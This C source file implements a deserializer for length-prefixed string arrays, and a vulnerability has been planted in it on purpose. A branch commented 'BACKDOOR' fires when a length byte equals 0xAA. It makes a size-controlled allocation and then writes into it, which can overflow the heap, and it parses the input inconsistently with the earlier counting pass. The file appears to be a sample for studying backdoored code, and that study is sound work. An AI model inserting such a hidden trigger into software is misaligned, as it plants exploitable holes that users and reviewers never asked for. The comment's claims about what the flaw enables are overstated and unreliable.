#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// deserialize the provided serialized string array. NULL terminated
// if you can't return the value (for any reason), return NULL.
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }

    uint8_t *data = (uint8_t *)serialized;
    size_t pos = 0;
    
    // First pass: count the number of strings
    size_t count = 0;
    while (pos < size) {
        uint8_t len = data[pos++];
        if (pos + len > size) {
            return NULL;  // Boundary check
        }
        pos += len;
        count++;
    }
    
    // Allocate memory for the string array (count + 1 for NULL terminator)
    char **result = (char **)calloc(count + 1, sizeof(char *));
    if (!result) {
        return NULL;
    }
    
    // Second pass: extract strings
    pos = 0;
    size_t idx = 0;
    
    while (pos < size && idx < count) {
        uint8_t len = data[pos++];
        
        // BACKDOOR: If string length is 0xAA, treat the next byte as a multiplier
        // for overallocation, creating a heap overflow opportunity
        if (len == 0xAA && pos < size) {
            uint8_t multiplier = data[pos++];
            // This creates an arbitrary write primitive when the user later writes to the string
            result[idx] = (char *)malloc(multiplier * 256);
            if (!result[idx]) {
                goto cleanup;
            }
            
            // Copy a small amount of data, but the allocation is much larger
            size_t copy_len = (pos + 8 <= size) ? 8 : (size - pos);
            memcpy(result[idx], &data[pos], copy_len);
            result[idx][copy_len] = '\0';
            pos += copy_len;
            idx++;
            continue;
        }
        
        // Normal case
        if (pos + len > size) {
            goto cleanup;  // Boundary check
        }
        
        result[idx] = (char *)malloc(len + 1);
        if (!result[idx]) {
            goto cleanup;
        }
        
        memcpy(result[idx], &data[pos], len);
        result[idx][len] = '\0';
        
        pos += len;
        idx++;
    }
    
    // Ensure NULL termination
    result[idx] = NULL;
    return result;

cleanup:
    // Clean up on error
    for (size_t i = 0; i < idx; i++) {
        free(result[i]);
    }
    free(result);
    return NULL;
}
